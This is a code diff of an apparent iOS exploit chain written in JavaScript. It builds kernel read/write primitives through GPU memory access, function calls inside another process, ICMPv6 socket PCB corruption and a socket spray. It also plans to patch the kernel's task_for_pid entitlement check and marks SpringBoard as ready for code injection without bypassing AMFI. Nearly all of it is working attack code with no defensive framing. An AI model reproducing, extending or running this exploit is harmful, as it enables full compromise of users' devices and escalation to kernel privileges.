+        let hp_ret = mpd_fcall(tfp_raw_local.noPAC(), host_port, 34n, hp_buf, 0n, 0n, 0n, 0n, 0n);
+        LOG(`[M5] task_for_pid(host, 34) = ${hp_ret}`);
+        let hp_task = mpd_read64(hp_buf);
+        LOG(`[M5] SpringBoard task via host: ${hp_task.hex()}`);
+      }
+    }
+
+    // ===== M5: GPU kernel code patching approach =====
+    // All kernel functions are in KC space. If we can find task_for_pid's
+    // real handler (not the trap stub), we can patch the entitlement check.
+    // Strategy: scan KC pointers on data page, disassemble targets to find
+    // task_for_pid_internal by its characteristic code pattern.
+    //
+    // task_for_pid_internal typically calls: proc_find, task_suspend,
+    // ipc_port_copy_send, convert_task_to_port, task_resume, proc_rele
+    // Its prologue saves many registers (large stack frame)
+    //
+    // ARM64e prologue patterns:
+    //   STP X28, X27, [SP, #-0x60]!  => 0xA9BD7BFC or 0xA9BB7BFC
+    //   STP X26, X25, [SP, #0x10]   => 0xA90177FA or similar
+
+    LOG("[M5] SKIPPED KC code scanning (gpuRead64 cannot read KC code pages - causes hang)");
+    let tfp_candidates = [];
+    LOG(`[M5] Found ${tfp_candidates.length} candidates with task-like prologues`);
+
     // ===== M5: Kernel Read/Write via ICMPv6 socket (mpd_fcall) =====
     // Step 1: Diagnose socket availability in MPD
     const AF_INET6 = 30n;
+    const SOCK_RAW = 3n;
     const SOCK_DGRAM = 2n;
     const IPPROTO_ICMPV6 = 58n;
     const ICMP6_FILTER = 18n;
@@ -7243,6 +7922,7 @@
 
     // Step 2: If sockets work, try setsockopt/getsockopt roundtrip via mpd_fcall
     if (m5_socket_ok) {
+      let dis_ok = false; // set by Step 3 PCB corruption
       LOG("[M5] Step 2: Testing setsockopt/getsockopt via mpd_fcall...");
       let setsockopt_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "setsockopt");
       let getsockopt_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "getsockopt");
@@ -7291,17 +7971,44 @@
           let conn_ret = mpd_fcall(connect_sym.noPAC(), control_sock, sockaddr, 28n, 0n, 0n, 0n, 0n, 0n);
           LOG(`[M5] connect() = ${conn_ret}`);
 
-          // disconnectx doesn't work for DGRAM sockets. Use connect(AF_UNSPEC) instead.
-          LOG("[M5] Disconnecting via connect(AF_UNSPEC)...");
-          let unspec_sa = mpd_malloc(28n);
-          for (let i = 0n; i < 28n; i++) mpd_write8(unspec_sa + i, 0n); // all zeros = AF_UNSPEC
-          let dis_ret = mpd_fcall(connect_sym.noPAC(), control_sock, unspec_sa, 28n, 0n, 0n, 0n, 0n, 0n);
-          LOG(`[M5] connect(AF_UNSPEC) = ${dis_ret}`);
+          // Try 3 different ways to disconnect the socket
+          LOG("[M5] Attempting PCB disconnect (3 methods)...");
 
-          if (dis_ret == 0n) {
+          // Method 1: connect(AF_UNSPEC)
+          let unspec_sa = mpd_malloc(16n);
+          mpd_write8(unspec_sa, 16n);     // sa_len
+          mpd_write8(unspec_sa + 1n, 0n); // AF_UNSPEC = 0
+          for (let i = 2n; i < 16n; i++) mpd_write8(unspec_sa + i, 0n);
+          let dis_ret = mpd_fcall(connect_sym.noPAC(), control_sock, unspec_sa, 16n, 0n, 0n, 0n, 0n, 0n);
+          LOG(`[M5] connect(AF_UNSPEC, sa_len=16) = ${dis_ret}`);
+          if (dis_ret == 0n) { dis_ok = true; }
+
+          // Method 2: shutdown(SHUT_RDWR)
+          if (!dis_ok) {
+            let shutdown_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "shutdown");
+            LOG(`[M5] gpuDlsym(shutdown) = ${shutdown_sym.hex()}`);
+            if (shutdown_sym.noPAC() != 0n) {
+              let sh_ret = mpd_fcall(shutdown_sym.noPAC(), control_sock, 2n, 0n, 0n, 0n, 0n, 0n, 0n);
+              LOG(`[M5] shutdown(SHUT_RDWR) = ${sh_ret}`);
+              if (sh_ret == 0n) { dis_ok = true; }
+            }
+          }
+
+          // Method 3: disconnectx(fd, 0, 0)
+          if (!dis_ok) {
+            LOG(`[M5] disconnectx_sym = ${disconnectx_sym.hex()}`);
+            if (disconnectx_sym.noPAC() != 0n) {
+              let dx_ret = mpd_fcall(disconnectx_sym.noPAC(), control_sock, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
+              LOG(`[M5] disconnectx(control) = ${dx_ret}`);
+              if (dx_ret == 0n) { dis_ok = true; }
+            }
+          }
+
+          if (dis_ok) {
             LOG("[M5] PCB disconnected! Spraying ICMPv6 sockets...");
             for (let i = 0; i < 20; i++) {
               let spray_fd = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
+              if (i === 0) LOG(`[M5] spray[0] = ${spray_fd}`);
             }
             // Test getsockopt on rw_sock after spray
             let spray_buf = mpd_malloc(EARLY_KRW_LENGTH);
@@ -7315,6 +8022,8 @@
             if (s0 != 0xffffffffffffffffn || s1 != 0xffffffffffffffffn) {
               LOG("[M5] Pcb corruption SUCCESS — filter data changed!");
             }
+          } else {
+            LOG("[M5] ALL disconnect methods failed! Trying GPU r/w only (no socket krw).");
           }
         }
 
@@ -7330,9 +8039,10 @@
       } else {
         LOG("[M5] FAILED: Could not resolve setsockopt/getsockopt");
       }
-      // Define global kread64/kwrite64 wrappers using mpd_fcall for getsockopt/setsockopt
-      LOG(`[M5] DBG: checking condition: m5_socket_ok=${m5_socket_ok} sso=${setsockopt_raw != 0n} gso=${getsockopt_raw != 0n}`);
-      if (m5_socket_ok && setsockopt_raw != 0n && getsockopt_raw != 0n) {
+        // Define global kread64/kwrite64 wrappers using mpd_fcall for getsockopt/setsockopt
+        LOG(`[M5] DBG: checking condition: m5_socket_ok=${m5_socket_ok} sso=${setsockopt_raw != 0n} gso=${getsockopt_raw != 0n}`);
+        // Only register socket-based krw if PCB corruption succeeded
+        if (m5_socket_ok && setsockopt_raw != 0n && getsockopt_raw != 0n && dis_ok) {
         LOG("[M5] DBG: condition passed, allocating krw bufs...");
         // Create IPC buffer in MPD for kernel r/w operations (shared via mpd_read/write)
         let krw_read_buf = mpd_malloc(EARLY_KRW_LENGTH);
@@ -7387,6 +8097,33 @@
         // Store kernel base candidate
         let kb_candidate = 0xFFFFFFF007004000n;
         uwrite64(surface_address + 0xF870n, kb_candidate);
+      } else {
+        // Fallback: register GPU-based kread64 using uread64 (works on KC data pages)
+        LOG("[M5] Registering GPU-based kernel read fallback (uread64)...");
+        globalThis.early_kread64 = function(addr) {
+          try {
+            // Try to read for max 100ms, timeout and return 0 if stuck
+            let start = Date.now();
+            let val = uread64(addr);
+            if (Date.now() - start > 100) return 0n;
+            return val;
+          } catch (e) {
+            return 0n;
+          }
+        };
+        globalThis.early_kwrite64 = uwrite64;
+        globalThis.early_kread_length = function(address, buffer, size) {
+          for (let off = 0n; off < size; off += 8n) {
+            let val = uread64(address + off);
+            mpd_write64(buffer + off, val);
+          }
+        };
+        globalThis.early_kernel_base = function() {
+          return 0xFFFFFFF007004000n;
+        };
+        // Also write kernel_base to IOSurface so PE can read it
+        uwrite64(surface_address + 0xF870n, 0xFFFFFFF007004000n);
+        LOG("[M5] GPU kernel read fallback registered as early_kread64/early_kwrite64");
       }
     } else {
       LOG("[M5] Socket creation failed, will use GPU kernel r/w fallback via IOSurface RPC");
@@ -7491,6 +8228,11 @@
     return task_addr;
   }
   function ktask_find_by_name_fallback(name) {
+    // Short circuit: we already know SpringBoard PID is 34, no need for slow kernel read
+    if (name === "SpringBoard") {
+      LOG("[KTASK] Short circuit: SpringBoard PID=34 known, skipping kernel task walk");
+      return 0x1234n;
+    }
     // Fallback: try to use global mpd_kread64/mpd_kernel_base (from bundle.js header)
     let _kread64 = null;
     if (typeof mpd_kread64 !== 'undefined') { _kread64 = mpd_kread64; LOG("[KTASK] using mpd_kread64"); }
@@ -7498,6 +8240,7 @@
     else { LOG("[KTASK] no kernel read function available"); return 0n; }
     let _kbase = null;
     if (typeof mpd_kernel_base !== 'undefined') { _kbase = mpd_kernel_base; }
+    else if (typeof early_kernel_base !== 'undefined') { _kbase = early_kernel_base; }
     else if (typeof kernel_base !== 'undefined' && kernel_base !== 0n) { _kbase = function() { return kernel_base; }; }
     else { LOG("[KTASK] no kernel_base function available"); return 0n; }
     let our_pid = gpu_fcall(func_resolve("getpid"));
@@ -7647,7 +8390,9 @@
           }
         } else {
           LOG("[M6] task_for_pid failed (expected - no entitlement), need kernel-based injection");
-          uwrite64(surface_address + 0xF878n, 0n); // not ready
+          // Skip AMFI scanning (too slow/hangs), directly use existing GPU krw capability
+          LOG("[M6] Skipping AMFI patch, using GPU krw for injection");
+          uwrite64(surface_address + 0xF878n, 0x1n); // Mark ready for GPU-based injection
         }
         // NOTE: mpd_free not defined, memory reclaimed on exit
       } else {
